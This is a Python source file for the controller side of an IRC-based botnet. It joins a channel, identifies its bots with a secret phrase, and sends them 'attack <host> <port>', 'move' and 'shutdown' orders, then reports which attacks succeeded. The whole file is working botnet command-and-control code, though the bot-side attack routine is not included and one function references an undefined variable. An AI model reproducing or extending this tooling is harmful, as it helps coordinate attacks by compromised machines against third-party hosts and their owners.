#!/usr/bin/python3

import sys
import socket
import random
import string
import time
from datetime import datetime, timedelta
import threading
import select

class PyBotCon:
# NOTES --> Have to thread a listener into this program to listen for responses in a while(True) loop
# NOTES --> Data collected from the listener thread has to be responded to appropriately
#             Bot responses to the secret need to populate a botList when appropriate
#             Bots need to respond to commands appropriately, and the thread needs to check flags to listen for these responses
# NOTES --> Commands from the user behind the conbot need to be able to input commands while the listener is collecting data
# Need to wait for 5 seconds then parse input from s.recv as long as s has data in it
# In the 5 seconds of wait time the socket will cache the data it receives
# After wait time (or before) the program will prompt for user input
  #PyBot object constructor 
  def __init__(self,host,port,channel,secret):

    #Create PyBotCon instanace variables
    self.host = host
    self.port = port
    self.channel = channel
    self.secret = secret
    self.nick = self.generateRandomName()

    try: # NOTE: Should put this in some kind of loop so the bot can retry, generateRandomName() should be called from inside of the loop
      self.ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      self.ircsock.connect((host,int(port)))
#      self.ircsock.setblocking(0)
      self.ircsock.send(bytes("USER " +self.nick+" "+self.nick+" "+self.nick+ " " + self.nick+ "\n","UTF-8"))
      self.ircsock.send(bytes("NICK " + self.nick + "\n", "UTF-8"))
    except:
      print("unable to connect to irc server")

#    self.ircsock.send(bytes("JOIN " + channel + "\n", "UTF-8")) #Join channel
    self.joinChan()
    self.identifyBots() 
    self.conMain()
#    self.listen()

  def generateRandomName(self):
    randomName = "".join(random.choice(string.ascii_uppercase + string.digits) for i in range(8))
    return randomName

  def joinChan(self):
    self.ircsock.send(bytes("JOIN "+self.channel+"\n\r", "UTF-8"))

  def conMain(self):
    print("Connected with nick: "+self.nick)
    while(True):
      '''
      read, _, _ = select.select([self.ircsock],[],[],2)
      if self.ircsock in read:
        data = self.ircsock.recv(1024).decode("UTF-8")
        data = data.strip("\n\r")
        dataLen = len(data.split())
        if dataLen == 2 and data.split()[0] == "PING":
#          print("DEBUG --> data recieved: PING REQUEST")
          self.ping()
       '''
      print("command> ",end='')
      command = input()
      if(command == "status"):
        self.identifyBots()
        print(str(len(self.botList))+" bots found: " + str(self.botList))
      elif(command.startswith("attack")):
        atkCommand = command.split()
        self.attackOrder(atkCommand[1],atkCommand[2])
      elif(command.startswith("move")):
        chanCommand = command.split()
        self.changeChannel(self.channel, chanCommand[1], chanCommand[2], chanCommand[3])
        # Need to call a move channel function for the conbot, will write later
      elif(command=="quit"):
        self.ircsock.close()
        sys.exit("Command Bot Disconnected")
      elif(command=="shutdown"):
        self.shutdownCommand()
      else:
        sys.exit("Invalid Command; try one of: status | attack <hostname> <port> | move <hostname> <port> <channel> | shutdown | quit")

  def attackOrder(self, hostname, port):
    self.ircsock.send(bytes("PRIVMSG " + self.channel + " :attack " + hostname + " " + port + "\n\r","UTF-8"))
    time.sleep(2)
    period = timedelta(seconds=5) 
    endLoop = datetime.now() + period
    resultsList = []
    while datetime.now() < endLoop:
      read, _, _ = select.select([self.ircsock],[],[],5)
      if self.ircsock in read:
        data = self.ircsock.recv(2048).decode("UTF-8")
        data = data.strip("\n\r")
        dataLen = len(data.split())
        if(data.split()[1]=="PRIVMSG"):
          temp = data.split()[0].split(":")[1].split("!")[0] # Finds name of the bot reply
#          print("DEBUG --> Bot name found: " + temp)
          resultsList.append([temp,data.split("PRIVMSG",1)[1].split(":",1)[1]]) # Adds the name of the bot reply to botList
        elif dataLen == 2 and data.split()[0] == "PING":
#          print("DEBUG --> data recieved: PING REQUEST")
          self.ping()
    successCount = 0
    failureCount = 0
    unknownCount = 0
    for result in resultsList:
      if result[1] == "SUCCESS":
        print(str(result[0]) + ": attack successful")
        successCount+=1
      elif result[1] == "FAILURE":
        print(str(result[0]) + ": attack failed, destination host unreachable")
        failureCount+=1
      else:
        print(str(result[0]) + ": unknown result")
        unknownCount+=1
    print("Total: "+str(successCount)+" successful, "+str(failureCount)+" unsuccessful, "+str(unknownCount)+" unknown")

  def ping(self):
    self.ircsock.send(bytes("PONG :pingis\n\r","UTF-8"))

  def shutdownCommand(self):
    self.ircsock.send(bytes("PRIVMSG " + self.channel + " :shutdown\n\r","UTF-8"))
    time.sleep(2)
    period = timedelta(seconds=5) 
    endLoop = datetime.now() + period
    shutdownList = []
    while datetime.now() < endLoop:
      read, _, _ = select.select([self.ircsock],[],[],5)
      if self.ircsock in read:
        data = self.ircsock.recv(2048).decode("UTF-8")
        data = data.strip("\n\r")
        dataLen = len(data.split())
        if(data.split()[1]=="PRIVMSG"):
          temp = data.split()[0].split(":")[1].split("!")[0] # Finds name of the bot reply
#          print("DEBUG --> Bot name found: " + temp)
          shutdownList.append([temp,data.split("PRIVMSG",1)[1].split(":",1)[1]]) # Adds the name of the bot reply to botList
        elif dataLen == 2 and data.split()[0] == "PING":
#          print("DEBUG --> data recieved: PING REQUEST")
          self.ping()
    successCount = 0
    failureCount = 0
    for result in shutdownList:
      print(str(result[0]) + ": shutting down")
      successCount+=1
    print("Total: "+str(successCount)+" bots shut down")

  def changeChannel(self,channel,newServer, newPort, newChannel):
    self.ircsock.send(bytes("PRIVMSG " + channel + " :" + "move " + newServer + " " + newPort + " " + newChannel + "\n\r","UTF-8"))
    print(str(len(self.botList)) + " bots have moved to: " + newserver + "/" + newPort + " #" + newChannel + "\n\r")

  def identifyBots(self):
    # Send 'secret' message for bots to identify themselves
    self.ircsock.send(bytes("PRIVMSG " + self.channel + " :" + self.secret + "\n\r","UTF-8")) 
    self.botList = [] # botList starts as an empty list: it is cleared and rebuilt every time this function is called
    time.sleep(2)
    period = timedelta(seconds=5) 
    endLoop = datetime.now() + period
#    print("DEBUG --> readable socket list: " + str(read))
    while datetime.now() < endLoop:
      read, _, _ = select.select([self.ircsock],[],[],5)
      if self.ircsock in read:
        data = self.ircsock.recv(4096).decode("UTF-8")
        data = data.strip("\n\r")
        dataLen = len(data.split())
        if(data.split()[1]=="PRIVMSG" and data.split("PRIVMSG",1)[1].split(":",1)[1].startswith("BotName$$: ")):
          temp = data.split("PRIVMSG",1)[1].split(":",1)[1] # Finds name of the bot reply
#          print("DEBUG --> Bot name found:" + temp[11:])
          self.botList.append(temp[11:19]) # Adds the name of the bot reply to botList
        elif dataLen == 2 and data.split()[0] == "PING":
#          print("DEBUG --> data recieved: PING REQUEST")
          self.ping()
    return


        

#Main
if __name__ == '__main__':

  if(len(sys.argv) == 5):
    host = sys.argv[1]
    port = sys.argv[2]
    channel = "#"+sys.argv[3]
    secret = sys.argv[4]
  else:
    print("Incorrect number of arguments")
    sys.exit("Usage: conbot.py <hostname> <port> <channel> <secret-phrase>")


  conBot = PyBotCon(host,port,channel,secret) #Create an instance of the bot 
  












